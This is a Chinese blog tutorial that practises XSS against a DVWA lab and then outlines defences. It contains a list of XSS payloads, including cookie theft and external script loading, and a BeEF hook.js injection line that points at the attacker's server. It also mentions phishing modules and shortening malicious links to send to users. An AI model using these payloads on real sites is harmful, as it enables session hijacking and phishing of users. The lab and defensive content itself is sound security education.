---
title: 记XSS漏洞操练
author: Pandaho
date: 2021-08-11 20:00:00 
categories: [Project] 
tags: [security]
image: /assets/img/security-XSS/cover.png
---




## 法律声明

**中华人民共和国刑法：** 第285、286、287条

**第二百八十五条** 违反国家规定，侵入国家事务、国防建设、尖端科学技术领域的计算机信息系统的，处三年以下有期徒刑或者拘役。

**第二百八十六条** 违反国家规定，对计算机信息系统功能进行删除、修改、增加、干扰，造成计算机信息系统不能正常运行，后果严重的，处五年以下有期徒刑或者拘役；后果特别严重的，处五年以上有期徒刑。违反国家规定，对计算机信息系统中存储、处理或者传输的数据和应用程序进行删除、修改、增加的操作，后果严重的，依照前款的规定处罚。故意制作、传播计算机病毒等破坏性程序，影响计算机系统正常运行，后果严重的，依照第一款的规定处罚。

**第二百八十七条** 利用计算机实施金融诈骗、盗窃、贪污、挪用公款、窃取国家秘密或者其他犯罪的，依照本法有关规定定罪处罚。



## 用知识的土壤来填埋这些坑洞

XSS跨站脚本攻击(Cross Site Scripting)攻击者往web页面里插入恶意script代码，当用户浏览该网页时，被嵌入在web页面script恶意脚本代码将被执行，从而达到恶意攻击用户的目的，xss攻击针对的是用户层面的攻击。

通过插入恶意的html，javascript脚本，来攻击网站，盗取用户Cookie、破坏页面结构、重定向到其它网站。

漏洞: 构造动态文档时，未进行正确的编码和转义。

所谓cookie就是用户身份凭证，所以在盗取了cookie之后，就可以在这个会话内通过这个cookie直接登录用户账户。

这里我们通过firefox演示一遍，打开dvwa登录后，在后台参数我们可以看到cookie的值

![图例](/assets/img/security-XSS/1.png)

我们将该值删除后再次访问会发现，没有cookie后被强制退出账户，再将值添加回去，访问恢复正常。

了解这些后我们开始xss的操练，进入XSS (Stored)，在插入框写入

`<script>alert(test)</script>`

执行后，该代码将永久插入前端中，后续用户每次点击该页面，该代码都会被执行，这便是存储型xss。

HTML <script> 标签

定义和用法

`<script> 标签用于定义客户端脚本，比如 JavaScript。`

script 元素既可以包含脚本语句，也可以通过 src 属性指向外部脚本文件。

必需的 type 属性规定脚本的 MIME 类型。

JavaScript 的常见应用时图像操作、表单验证以及动态内容更新。

alert()可以用来简单而明了地将括号内的文本信息显示在对话框中，我们将它称为警示对话框，并且该对话框上包含一个“确认”按钮，用户阅读完所显示的信息后，只需单击该按钮就可以关闭对话框。

存储型xss又称持久性xss，攻击脚本将被永久地存在在目标服务器的数据库或文件中，具有很高的隐蔽性，如在个人信息或发表文章等地方，插入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，用户访问该页面的时候触发代码执行。

了解了存储型后我们尝试反射型xss，进入XSS (Reflected)，在url上构建代码

`http://192.168.80.128/vulnerabilities/xss_r/?name=<script>alert(test)</script>`

将代码再进行[短链接转换](https://www.ft12.com) 后发给用户，用户只要访问url就会受到xss反射型攻击。

 反射型xss：非持久化xss，需要欺骗用户自己去点击链接才能触发xss代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。

DOM型xss：不经过后端，DOM-xss漏洞是基于文档对象模型（Document Object Model）的一种漏洞，DOM-xss是通过url传入参数去控制触发的，其实也属于反射型xss。

```
常用的payload
<script>alert(1)</script> #最普通的xss
<script>alert(document.cookie)</script> #获取cookie
<a href="javascript:alert('xss')">xss</a> #a链接的xss
<script src='http://baidu.com/xss.js'></script> # 外部攻击代码
<img src=x onerror=alert(1)> #加载图形失败执行
<iframe onload=alert('xss')> #框架
<svg onload=alert(1)>
<video onloadstart=alert(1) src="/media/hack-the-planet.mp4" />
<body onload=alert(1)>
<style onload=alert(1)></style>
<input onmouseover=alert(1)>
```

了解完基础的xss操作后，再看下相关的工具使用。

BeEF，全称The Browser Exploitation Framework，是一款针对浏览器的渗透测试工具。 用Ruby语言开发的，用于实现对XSS漏洞的攻击和利用。

BeEF主要是往网页中插入一段名为hook.js的JS脚本代码，如果浏览器访问了有hook.js(钩子)的页面，就会被hook(勾住)，勾连的浏览器会执行初始代码返回一些信息，接着目标主机会每隔一段时间（默认为1秒）就会向BeEF服务器发送一个请求，询问是否有新的代码需要执行。BeEF服务器本质上就像一个Web应用，被分为前端和后端。前端会轮询后端是否有新的数据需要更新，同时前端也可以向后端发送指示， BeEF持有者可以通过浏览器来登录 BeEF 的后端，来控制前端(用户的浏览器)。BeEF一般和XSS漏洞结合使用。

```
sudo apt-get install beef-xss #安装
vim /usr/share/beef-xss/config.yaml   #配置beef
Beef-xss #启动
systemctl start beef-xss.service         #开启beef服务
systemctl stop beef-xss.service         #关闭beef服务
systemctl restart beef-xss.service      #重启beef服务

<script src='http://192.168.80.128:3000/hook.js'></script>   #构建好代码后，在dvwa进行xss攻击
回到beef-xss我们能看到主机已经被监控，选择主机，进入commands可选择各类命令进行攻击
Redirect Browser  网页重定向
Pretty Theft  登录弹窗伪造
```

绿色：适用于当前浏览器

橙色：适用于当前浏览器，但会被用户发现

灰色：不适应当前浏览器，可尝试使用。

由此可见XSS的危害是非常严重的：

针对用户：窃取cookie劫持会话、网络钓鱼、放马挖矿、广告刷流量

针对WEB服务：劫持后台、篡改页面、传播蠕虫、内网扫描

现在针对XSS防御的总体思路是：对输入（和url参数）进行过滤，对输出进行编码。过滤用户（客户端）提交的有害信息，从而达到防范XSS攻击的效果。

1、输入验证过滤：

简单来说，输入验证就是对用户提交的信息进行有效验证，仅接受指定长度范围内的，采用适当格式的内容提交，阻止或忽略除此之外的其他任何数据。

输入是否仅包含合法字符

输入字符串是否超过最大长度限制

输入如果为数字，数字是否在指定范围内

输入是否符合特殊格式要求

2、输出编码

HTML编码主要用对应的HTML实体替代字符。

黑白名单

不管采用输入过滤还是输出编码，都是针对数据信息进行黑/白名单式的过滤

3、防御DOM-XSS

避免客户端文档重写，重定向或其他敏感操作

4、HTTPonly防范劫持cookie

HTTPonly由微软最早提出，至今已经成为一个标准，浏览器将禁止页面的javascript访问带有HTTPonly属性的cookie。



## 参考来源

TI安全实验室  
[HTML详解](https://www.w3school.com.cn/h.asp)  
[BEEF详解](https://blog.csdn.net/weixin_53549425/article/details/119078739)  
